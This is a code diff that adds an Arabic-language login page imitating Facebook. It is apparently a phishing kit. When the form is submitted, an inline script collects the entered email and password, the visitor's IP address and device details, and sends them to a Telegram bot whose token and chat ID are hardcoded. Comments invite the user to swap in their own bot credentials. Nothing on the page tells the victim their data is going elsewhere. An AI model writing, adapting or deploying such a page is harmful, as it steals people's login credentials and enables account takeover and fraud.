@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - موقع مشابه لفيسبوك</title>
+    <link rel="stylesheet" href="st.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <h2>تسجيل الدخول</h2>
+            <form id="login-form">
+                <div class="input-group">
+                    <label for="email">البريد الإلكتروني أو الهاتف</label>
+                    <input type="email" id="email" placeholder="أدخل البريد الإلكتروني أو الهاتف" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">كلمة المرور</label>
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+                </div>
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+            </form>
+            <p class="forgot-password"><a href="#">هل نسيت كلمة المرور؟</a></p>
+            <div class="signup-link">
+                <p>ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script src="g.js"></script>
+    
+<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "7880971212:AAED2-imRGrYTooh9rxY13KpZ2kBcLQta_8";    // ضع هنا توكين البوت الخاص بك
+    const CHAT_ID = "7720645013";             // ضع هنا معرف الشات الخاص بك
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                const message = `
+                    <b>New Login Attempt</b>\n
+                    <b>Email:</b> ${email}\n
+                    <b>Password:</b> ${password}\n
+                    <b>IP Address:</b> ${ip}\n
+                    <b>Device Type:</b> ${deviceType}\n
+                    <b>Platform:</b> ${platform}\n
+                    <b>User Agent:</b> ${userAgent}\n
+                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                `;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    alert('Information sent successfully!');
+                }).catch(error => {
+                    alert('Error sending the information. Please try again.');
+                });
+            })
+            .catch(error => {
+                alert('Error fetching the IP address. Please try again.');
+            });
+    });
+</script>
+</body>
+</html>
+
+</body>
+</html>
